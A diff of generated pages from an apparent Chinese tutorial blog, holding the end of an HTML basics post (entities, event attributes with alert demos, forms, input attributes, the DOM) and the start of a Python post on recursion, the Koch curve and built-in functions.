+<td align="left">&amp;#39;</td>
+</tr>
+<tr>
+<td align="left">©</td>
+<td align="left">版权（copyright）</td>
+<td align="left">&amp;copy;</td>
+<td align="left">&amp;#169;</td>
+</tr>
+</tbody></table>
+<p>（5）HTML属性–全局属性</p>
+<p>全局属性是可用于为任何HTML元素赋予意义和语境的属性。</p>
+<table>
+<thead>
+<tr>
+<th align="center">属性</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">class</td>
+<td align="center">规定元素的一个或多个类名(引用样式表中的类)</td>
+</tr>
+<tr>
+<td align="center">hidden</td>
+<td align="center">规定元素进行隐藏</td>
+</tr>
+<tr>
+<td align="center">id</td>
+<td align="center">规定元素的唯一id</td>
+</tr>
+<tr>
+<td align="center">style</td>
+<td align="center">规定元素的行内CSS样式</td>
+</tr>
+<tr>
+<td align="center">title</td>
+<td align="center">规定有关元素的额外信息</td>
+</tr>
+<tr>
+<td align="center">data-*</td>
+<td align="center">路由。用于存储页面或应用程序的私有定制数据</td>
+</tr>
+</tbody></table>
+<p>ps：id、class方便使用css和JavaScript控制对应的元素，id是唯一的，class是对应一个类</p>
+<h2 id="HTML事件属性"><a href="#HTML事件属性" class="headerlink" title="HTML事件属性"></a>HTML事件属性</h2><p>（1）事件型属性是可以使HTML事件触发浏览器中的行为，比方说当用户点击某个HTML元素时启动一段JavaScript。</p>
+<p>（2）事件型属性通常可以分为：全局事件属性，窗口事件属性，表单事件属性，键盘事件属性，鼠标事件属性，多媒体事件属性，其他事件属性。</p>
+<h3 id="Window事件属性—onerror事件"><a href="#Window事件属性—onerror事件" class="headerlink" title="Window事件属性—onerror事件"></a>Window事件属性—onerror事件</h3><p>（1）onerror：在错误发生时运行的脚本。</p>
+<p>（2）定义和用法：</p>
+<ul>
+<li>onerror事件会在文档或图像加载过程中发生错误时被触发。</li>
+<li>在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。</li>
+</ul>
+<pre><code class="html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;!-- onerror 事件会在文档或图像加载过程中发生错误时被触发。--&gt;
+        &lt;img src=&quot;image.gif&quot;
+             onerror=&quot;alert(&#39;The image could not be loaded.&#39;)&quot; /&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/EOgsuHUzaYPecBd.png" alt="image-20210315165838173"></p>
+<h3 id="Window事件属性—onload事件"><a href="#Window事件属性—onload事件" class="headerlink" title="Window事件属性—onload事件"></a>Window事件属性—onload事件</h3><p>（1）onload：页面结束加载之后触发。</p>
+<p>（2）定义和用法：</p>
+<ul>
+<li>onload属性在对象已加载时触发。</li>
+<li>onload常用在&lt;body&gt;中，一旦完全加载所有内容(包括图像、脚本文件、CSS文件等)，就执行一段脚本。</li>
+</ul>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body onload=&quot;alert(&#39;该页面已加载！&#39;)&quot;&gt;
+        &lt;h1&gt;
+            Hello World!
+        &lt;/h1&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/86aqodCfvhipGBl.png" alt="image-20210315180956314"></p>
+<h3 id="Form事件属性—onchange事件"><a href="#Form事件属性—onchange事件" class="headerlink" title="Form事件属性—onchange事件"></a>Form事件属性—onchange事件</h3><p>（1）onchange：在元素值被改变时运行的脚本。</p>
+<p>（2）定义和用法：</p>
+<ul>
+<li>onchange事件会在域的内容改变时发生。</li>
+<li>onchange事件也可用于单选框与复选框改变后触发的事件</li>
+<li>onchange属性适用于：&lt;input&gt;、&lt;textarea&gt;以及&lt;select&gt;元素。</li>
+</ul>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;script&gt;
+            function myFunction()&#123;
+                var x=document.getElementById(&quot;fname&quot;);
+                x.value=x.value.toUpperCase();
+            &#125;
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        输入你的名字：&lt;input type=&quot;text&quot; id=&quot;fname&quot; onchange=&quot;myFunction()&quot;&gt;
+        &lt;!--当你离开输入框后，函数将被触发，将小写字母转变为大写字母--&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/nmSdzCarPgTRs1q.png" alt="image-20210315181941724"></p>
+<p><img src="https://i.loli.net/2021/03/15/2olfHGX8RTmL3wS.png" alt="image-20210315181959113"></p>
+<h3 id="Form事件属性—onfocus事件"><a href="#Form事件属性—onfocus事件" class="headerlink" title="Form事件属性—onfocus事件"></a>Form事件属性—onfocus事件</h3><p>（1）onfocus：当元素获得焦点时运行的脚本。</p>
+<p>（2）定义和用法：</p>
+<ul>
+<li>onfocus属性在元素获得焦点时触发</li>
+<li>onfocus常用于&lt;input&gt;、&lt;select&gt;以及&lt;a&gt;</li>
+</ul>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;script&gt;
+            function myFunction(x)&#123;
+                x.style.background=&quot;yellow&quot;;
+            &#125;
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        输入你的名字：&lt;input type=&quot;text&quot; onfocus=&quot;myFunction(this)&quot;&gt;
+        &lt;!--当输入框获取焦点时，修改背景色将被触发--&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/1G263yPbEOo8qfe.png" alt="image-20210315182624985"></p>
+<p><img src="https://i.loli.net/2021/03/15/vk34qrVUO8FSlwB.png" alt="image-20210315182637474"></p>
+<h3 id="Mouse事件属性—onclick事件"><a href="#Mouse事件属性—onclick事件" class="headerlink" title="Mouse事件属性—onclick事件"></a>Mouse事件属性—onclick事件</h3><p>onclick：元素上发生鼠标点击时触发。</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;script&gt;
+            function myFunction()&#123;
+                document.getElementById(&quot;demo&quot;).innerHTML=&quot;Hello World&quot;;
+            &#125;
+        &lt;/script&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;button onclick=&quot;myFunction()&quot;&gt;
+            点我
+        &lt;/button&gt;
+        &lt;p id=&quot;demo&quot;&gt;
+        &lt;/p&gt;
+        &lt;!-- 点击将触发onclick事件 --&gt;
+        &lt;button onclick=&quot;window.location.href=&#39;http:\/\/127.0.0.1&#39;&quot;&gt;
+            填写个人信息
+        &lt;/button&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/OsY4WdJU2cRVurM.png" alt="image-20210315184435547"></p>
+<h3 id="Mouse事件属性—onmousemove事件"><a href="#Mouse事件属性—onmousemove事件" class="headerlink" title="Mouse事件属性—onmousemove事件"></a>Mouse事件属性—onmousemove事件</h3><p>onmouseover：当鼠标指针移动到元素时触发</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;input onmousemove=&quot;alert(&#39;The event has been triggered&#39;)&quot;&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/4iME3hV2CygcuX1.png" alt="image-20210315185221847"></p>
+<h3 id="Mouse事件属性—onmouseover事件"><a href="#Mouse事件属性—onmouseover事件" class="headerlink" title="Mouse事件属性—onmouseover事件"></a>Mouse事件属性—onmouseover事件</h3><pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;h1 onmouseover=&quot;alert(&#39;The event has been triggered&#39;)&quot;&gt;hanker&lt;/h1&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/wAdP5poI19yfmJF.png" alt="image-20210315185526053"></p>
+<h3 id="HTML列表"><a href="#HTML列表" class="headerlink" title="HTML列表"></a>HTML列表</h3><p>HTML支持有序、无序列表</p>
+<p>（1）定义无序列表：ul+li</p>
+<pre><code class="html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;ul&gt;
+            &lt;li&gt;咖啡&lt;/li&gt;
+            &lt;li&gt;茶&lt;/li&gt;
+            &lt;li&gt;牛奶&lt;/li&gt;
+        &lt;/ul&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/vtYNhQykP7JHfWM.png" alt="image-20210315190107145"></p>
+<p>（2）定义有序列表：ol+li</p>
+<pre><code class="html">&lt;html&gt;
+    &lt;body&gt;
+        &lt;ol&gt;
+            &lt;li&gt;咖啡&lt;/li&gt;
+            &lt;li&gt;茶&lt;/li&gt;
+            &lt;li&gt;牛奶&lt;/li&gt;
+        &lt;/ol&gt;
+        &lt;ol start=&quot;50&quot;&gt;
+           &lt;li&gt;咖啡&lt;/li&gt;
+           &lt;li&gt;茶&lt;/li&gt;
+           &lt;li&gt;牛奶&lt;/li&gt; 
+        &lt;/ol&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/RFi12fZT4vWtKUb.png" alt="image-20210315190327677"></p>
+<h3 id="HTML表单"><a href="#HTML表单" class="headerlink" title="HTML表单"></a>HTML表单</h3><p>（1）HTML表单用于搜集不同类型的用户输入</p>
+<p>（2）&lt;form&gt;元素</p>
+<ul>
+<li>HTML表单用于收集用户输入</li>
+</ul>
+<p>（3）HTML表单包含表单元素。</p>
+<ul>
+<li>表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等。</li>
+</ul>
+<p>（4）&lt;input&gt;元素是最重要的表单元素</p>
+<p>（5）&lt;input&gt;元素有很多形态，根据不同的type属性。</p>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">text</td>
+<td align="center">定义常规文本输入</td>
+</tr>
+<tr>
+<td align="center">radio</td>
+<td align="center">定义单选按钮输入（选择多个选择之一）</td>
+</tr>
+<tr>
+<td align="center">submit</td>
+<td align="center">定义提交按钮（提交表单）</td>
+</tr>
+</tbody></table>
+<h4 id="文本输入"><a href="#文本输入" class="headerlink" title="文本输入"></a>文本输入</h4><p>&lt;input type=”text”&gt;定义用于文本输入的单行输入字段</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;form&gt;
+            First name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;firstname&quot;/&gt;
+            &lt;br&gt;
+            Last name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;/&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/bpMRWlGhvE3J9jU.png" alt="image-20210315191807882"></p>
+<h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p>（1）&lt;input type=”radio”&gt;定义单选按钮</p>
+<p>（2）单选按钮允许用户在有限数量的选项中选择其中之一。</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;form&gt;
+            &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;/&gt;Male
+            &lt;br&gt;
+            &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;/&gt;Female
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/c3WLbOfRqaQTGnv.png" alt="image-20210315192243280"></p>
+<h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h4><p>（1）&lt;input type=”submit”&gt;定义用于向表单处理程序提交表单的按钮</p>
+<p>（2）表单处理程序通常是包含用来处理输入数据的脚本的服务器页面</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;form action=&#39;form.php&#39;&gt;
+            First name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;firstname&quot;/&gt;
+            &lt;br&gt;
+            Last name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;/&gt;
+            &lt;br&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;submit&quot;/&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/uWx9OeFcNGq3bHM.png" alt="image-20210315192941921"></p>
+<p><img src="https://i.loli.net/2021/03/15/UnsfAECtjNOgGla.png" alt="image-20210315193009434"></p>
+<h4 id="各种框总结"><a href="#各种框总结" class="headerlink" title="各种框总结"></a>各种框总结</h4><ul>
+<li>文本框：text</li>
+<li>隐藏文本框：hidden</li>
+<li>密码框：password</li>
+<li>多选框：checkbox</li>
+<li>单选框：radio</li>
+<li>提交按钮：submit</li>
+<li>重置按钮：reset</li>
+<li>多选框：select、option</li>
+</ul>
+<h4 id="action属性"><a href="#action属性" class="headerlink" title="action属性"></a>action属性</h4><p>（1）action属性定义在提交表单时执行的动作</p>
+<p>（2）向服务器提交表单通常做法是使用提交按钮</p>
+<p>（3）通常，表单会被提交到web服务器上的网页</p>
+<pre><code class="html">&lt;form action=&quot;action_page.php&quot;&gt;</code></pre>
+<p>（4）如果省略action属性，则action会被设置为当前页面</p>
+<h4 id="method属性"><a href="#method属性" class="headerlink" title="method属性"></a>method属性</h4><p>（1）method属性规定在提交表单时所用的HTTP方法(GET或POST)</p>
+<pre><code class="html">&lt;form action=&quot;action_page.php&quot; method=&quot;GET&quot;&gt;
+&lt;form action=&quot;action_page.php&quot; method=&quot;POST&quot;&gt;</code></pre>
+<p>（2）如果表单提交是被动的（比如搜索引擎查询），并且没有敏感信息。表单数据在页面地址栏是可见的。这时使用GET.</p>
+<pre><code>action_page.php?firstname=Mickey&amp;lastname=Mouse</code></pre>
+<p>（3）如果表单正在更新数据，或者包含敏感信息(例如密码）。POST的安全性更佳，因为在页面地址栏中被提交的数据是不可见的。</p>
+<h4 id="校验函数"><a href="#校验函数" class="headerlink" title="校验函数"></a>校验函数</h4><p>onsubmit事件在表单提交时触发，当检验不通过时，就不会提交表单内容。</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;title&gt;login&lt;/title&gt;
+    &lt;/head&gt;
+
+    &lt;body&gt;
+        &lt;h3&gt;
+            Login Please
+        &lt;/h3&gt;
+        &lt;script type=&quot;text/javascript&quot;&gt;
+            function check()&#123;
+                alert(&quot;check函数被触发了~&quot;)
+                return true   //此处改为false就不会提交，会返回false
+            &#125;
+        &lt;/script&gt;
+
+        &lt;form action=&quot;/login.php&quot; method=&quot;post&quot; onsubmit=&quot;return check()&quot;&gt;
+            姓名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;
+            密码：&lt;input type=&quot;text&quot; password=&quot;password&quot;&gt;&lt;br&gt;
+            &lt;input value=&quot;提交&quot; type=&quot;submit&quot; name=&quot;submit&quot;&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/Y1lJreIVGRN7zKo.png" alt="image-20210315203458505"></p>
+<h3 id="HTML的form属性"><a href="#HTML的form属性" class="headerlink" title="HTML的form属性"></a>HTML的form属性</h3><p><img src="https://i.loli.net/2021/03/15/1jKqzZuAaE8GdsX.png" alt="image-20210315194714650"></p>
+<h3 id="常见的输入限制"><a href="#常见的输入限制" class="headerlink" title="常见的输入限制"></a>常见的输入限制</h3><p><img src="https://i.loli.net/2021/03/15/cX2CD8gmvsU5NM4.png" alt="image-20210315194834108"></p>
+<h4 id="value属性"><a href="#value属性" class="headerlink" title="value属性"></a>value属性</h4><p>value属性规定输入字段的初始值</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;form&gt;
+            First name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;dayang&quot;&gt;
+            &lt;br&gt;
+            Last name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/EQ3ZUHK25VmNazJ.png" alt="image-20210315200004163"></p>
+<h4 id="readonly属性"><a href="#readonly属性" class="headerlink" title="readonly属性"></a>readonly属性</h4><p>（1）readonly属性规定输入字段为只读（不能修改），可以提交元素</p>
+<p>（2）readonly属性不需要值。它等同于readonly=”readonly”</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;form&gt;
+            First name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;dayang&quot; readonly&gt;
+            &lt;br&gt;
+            Last name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/C5cdxHKPrQlEyks.png" alt="image-20210315200652188"></p>
+<h4 id="disabled属性"><a href="#disabled属性" class="headerlink" title="disabled属性"></a>disabled属性</h4><p>（1）disabled属性规定输入字段是禁用的。</p>
+<p>（2）被禁用的元素是不可用和不可点击的，且被禁用的元素不会被提交</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;form action=&quot;&quot;&gt;
+            First name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;dayang&quot; disabled&gt;
+            &lt;br&gt;
+            Last name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/8coQvE591CNPrse.png" alt="image-20210315201127969"></p>
+<h4 id="maxlength属性"><a href="#maxlength属性" class="headerlink" title="maxlength属性"></a>maxlength属性</h4><p>（1）maxlength属性规定输入字段允许的最大长度，如设置maxlength属性，则输入控件不会接受超过所允许数的字符。</p>
+<p>（2）该属性不会提供任何反馈，如果需要提醒用户，则必须编写JavaScript代码。</p>
+<pre><code class="html">&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;form&gt;
+            First name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; maxlength=&quot;5&quot;&gt;
+            &lt;br&gt;
+            Last name:&lt;br&gt;
+            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/G3P7WS9TyxmajAC.png" alt="image-20210315202015566"></p>
+<h3 id="HTML-DOM"><a href="#HTML-DOM" class="headerlink" title="HTML DOM"></a>HTML DOM</h3><p>（1）HTML的文档对象模型</p>
+<p>（2）HTML的标准编程接口</p>
+<p>（3）HTML DOM定义了所有HTML元素的对象和属性，以及访问他们的方法。</p>
+<p>（4）换言之，HTML DOM 是关于如何获取、修改、添加或删除HTML元素的标准。</p>
+<pre><code class="html">&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;文档标题&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;a href=&quot;http://since1994.cn&quot;&gt;我的链接&lt;/a&gt;
+        &lt;h1&gt;
+            我的标题
+        &lt;/h1&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/03/15/6B3MxtUWLwaRqK5.png" alt="image-20210315204251708"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/03/15/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/HTML%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python/深入Python语言(六)-函数和代码复用02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/11/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AD)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A802/">深入Python语言(六)-函数和代码复用02</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/11/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AD)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A802/" class="archive-article-date">
+  	<time datetime="2021-02-11T03:21:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="代码复用和模块化设计"><a href="#代码复用和模块化设计" class="headerlink" title="代码复用和模块化设计"></a>代码复用和模块化设计</h2><p><strong>要点：函数是程序的一种抽象，它通过封装实现代码复用，可以利用函数对程序进行模块化设计</strong></p>
+<p>（1）程序代码若是顺序但无组织的，不仅不利于阅读和理解，也很难进行升级和维护。因此，需要对代码进行抽象，形成易于理解的结构。当代编程语言从代码层面采用函数和对象两种抽象方式，分别对应<strong>面向过程和面向对象编程思想。</strong></p>
+<p>（2）函数封装的直接好处是代码复用，从而避免相同功能代码在调用出重复编写。代码复用产生了另一个好处，当更新函数功能时，所有被调用处的功能都被更新。</p>
+<p>（3）面向过程是一种以过程描述为主要方法的编程方式，该方法要求列出解决问题所需要的步骤，再用函数将这些步骤逐一实现，使用时依次建立并调用函数或编写语句即可。这是一种基本且自然的程序设计方法，函数通过将步骤或子功能封装实现代码复用并简化程序设计难度。</p>
+<p>（4）面向对象编程：对象是程序的一种高级抽象方式，它将程序代码组织为更高级的类。对象包括表征对象特征的属性和代表对象操作的方法。在程序设计中，若&lt;a&gt;代表对象，获取其属性&lt;b&gt;采用&lt;a&gt;.&lt;b&gt;，调用其方法&lt;c&gt;采用&lt;a&gt;.&lt;c&gt;()。对象的方法具有程序功能性，因此采用函数形式封装。对象可以凝聚更多代码，所以面向对象编程更适合代码规模较大，交互逻辑复杂的程序。</p>
+<p>（5）Python语言同时支持面向过程和面向对象两种编程方式。无论是面向过程还是面向对象编程，对程序合理划分功能模块并基于模块设计程序是一种常用方法，被称为“模块化设计”，即将一个程序分隔成短小的程序段，每一段程序完成一个小的功能。</p>
+<h2 id="函数的递归"><a href="#函数的递归" class="headerlink" title="函数的递归"></a>函数的递归</h2><h3 id="递归的定义"><a href="#递归的定义" class="headerlink" title="递归的定义"></a>递归的定义</h3><p>（1）函数定义中调用函数自身的方式称为递归。例如数学中的阶乘</p>
+<p><img src="https://i.loli.net/2021/02/11/AmfsY7pe3naKUHS.png" alt="image-20210211152129282"></p>
+<p>（2）递归的两个关键特征：</p>
+<ul>
+<li>存在一个或多个基例(例如0!)，基例不需要再次递归，它是确定的表达示或已知的值。</li>
+<li>所有递归链要以一个或多个基例结尾</li>
+</ul>
+<h3 id="递归的使用方法"><a href="#递归的使用方法" class="headerlink" title="递归的使用方法"></a>递归的使用方法</h3><p>（1）实例：阶乘的计算：根据用户输入的整数n，计算并输出n的阶乘值。</p>
+<pre><code class="python">def fact(n):
+    if n == 0:
+        return 1
+    else:
+        return n*fact(n-1)
+num = eval(input(&quot;请输入一个整数：&quot;))
+print(fact(abs(int(num))))</code></pre>
+<p>（2）fact()函数在其定义内部引用了自身，形成了递归过程(第5行)。无限制的递归将耗尽计算资源，因此需要设计基例使得递归逐层返回。fact()函数通过if语句给出了n为0时的基例，当n==0，fact()函数不再递归，返回数值1，若n!=0,则通过递归返回n与n-1阶乘的乘积。</p>
+<p>（3）由于负数和小数通过减一无法达到递归的基例(n==0)，代码第7行通过abs()和int()函数将用户输入转变成非负整数。</p>
+<p>（4）递归遵循函数第语义，每次调用都会引起新函数的开始，表示它有本地变量值的副本，包括函数的参数。每次调用时，函数参数的副本会临时存储，递归中各函数在运算自己的参数，互不影响。当基例结束运算并返回值时，各函数逐层结束运算，向调用者返回计算结果。</p>
+<p><strong>注意：使用递归一定要注意基例的构建，否则递归无法返回将会报错。</strong></p>
+<p>（5）实例：字符串反转：对于用户输入的字符串s，输出反转后的字符串。</p>
+<p>解决问题的基本思想：把一个字符串看成仅由首字符和剩余字符串两部分组成，若将剩余字符串和首字符交换，就完成了反转整个字符串。代码如下：</p>
+<pre><code class="python">&gt;&gt;&gt; def reverse(s):
+    return reverse(s[1:]) + s[0]    #s[0]是首字符，s[1:]是剩余字符串
+
+&gt;&gt;&gt; reverse(&quot;abc&quot;)
+Traceback (most recent call last):
+  File &quot;&lt;pyshell#3&gt;&quot;, line 1, in &lt;module&gt;
+    reverse(&quot;abc&quot;)
+  File &quot;&lt;pyshell#2&gt;&quot;, line 2, in reverse
+    return reverse(s[1:]) + s[0]
+  File &quot;&lt;pyshell#2&gt;&quot;, line 2, in reverse
+    return reverse(s[1:]) + s[0]
+  File &quot;&lt;pyshell#2&gt;&quot;, line 2, in reverse
+    return reverse(s[1:]) + s[0]
+  [Previous line repeated 991 more times]
+RecursionError: maximum recursion depth exceeded</code></pre>
+<p>（6）上述代码出错，该错误表明系统无法执行reverse()函数创建的递归，这是因为reverse()函数没有基例，递归层数超过了系统允许的最大递归深度。默认情况下，当递归调用到1000层，Python解释器将终止程序。递归深度是为了防止无限递归错误而设计的，当用户编写的正确递归程序需要超过1000层时，可以通过如下代码设定。</p>
+<pre><code class="python">&gt;&gt;&gt;import sys
+&gt;&gt;&gt;sys.setrecursionlimit(2000)    #2000是新的递归层数</code></pre>
+<p>（7）reverse()函数超过递归深度是因为没有设计基例。可以把基例设计为字符串的最短形式，即空字符串。代码如下：</p>
+<pre><code class="python">def reverse(s):
+    if s == &quot;&quot;:
+        return s
+    else:
+        return reverse(s[1:]) + s[0]
+str = input(&quot;请输入一个字符串：&quot;)
+print(reverse(str))</code></pre>
+<h2 id="实例：科赫曲线绘制"><a href="#实例：科赫曲线绘制" class="headerlink" title="实例：科赫曲线绘制"></a>实例：科赫曲线绘制</h2><p>（1）科赫曲线在众多经典数学曲线中非常著名，由于其形状类似雪花，也被称为雪花曲线。</p>
+<p>（2）正整数n代表科赫曲线的阶数，表示生成科赫曲线过程的操作次数。科赫曲线初始化阶数为0，表示一个长度为L的直线。对于直线L，将其等分为3段，中间一段用边长为L/3的等边三角形的两个边代替，得到1阶科赫曲线，它包含4条线段。进一步对每条线段重复同样的操作后得到2阶科赫曲线。继续重复同样的操作n次可以得到n阶科赫曲线。</p>
+<p><img src="https://i.loli.net/2021/02/11/2GwhWLdFHp6fSTv.png" alt="image-20210211210938960"></p>
+<p>（3）科赫曲线属于分形几何分支，其绘制过程体现了递归思想，绘制过程代码如下：</p>
+<pre><code class="python">import turtle
+def koch(size, n):
+    if n==0:
+        turtle.fd(size)
+    else:
+        for angle in [0, 60, -120, 60]:
+            turtle.left(angle)
+            koch(size/3, n-1)
+def main():
+    turtle.setup(800,400)
+    turtle.speed(0)          #控制绘制速度
+    turtle.penup()
+    turtle.goto(-300,-50)
+    turtle.pendown()
+    turtle.pensize(2)
+    koch(600,3)              #0阶科赫曲线长度，阶数
+    turtle.hideturtle()
+main()</code></pre>
+<p>（4）n阶科赫曲线的绘制相当于在画笔前进方向的0°、60°、-120°和60°分别绘制n-1阶曲线。在给定初始图形后，通过科赫曲线可以生成很多漂亮的图形。代码如下。</p>
+<pre><code class="python">import turtle
+def koch(size, n):
+    if n == 0:
+        turtle.fd(size)
+    else:
+        for angle in [0, 60, -120, 60]:
+            turtle.left(angle)
+            koch(size/3, n-1)
+def main():
+    turtle.setup(600,600)
+    turtle.speed(0)
+    turtle.penup()
+    turtle.goto(-200,100)
+    turtle.pendown()
+    turtle.pensize(2)
+    level=5
+    koch(400,level)
+    turtle.right(120)
+    koch(400,level)
+    turtle.hideturtle()
+main()</code></pre>
+<h2 id="Python内置函数"><a href="#Python内置函数" class="headerlink" title="Python内置函数"></a>Python内置函数</h2><p>（1）Python解释器提供了68个内置函数，这些函数不需要引用库直接使用。以下对部分函数进行说明</p>
+<p>（2）all()函数一般针对组合数据类型，如果其中每个元素都是True，则返回True，否则返回False。注意：整数0、空字符串””、空列表[]等都被当做False。</p>
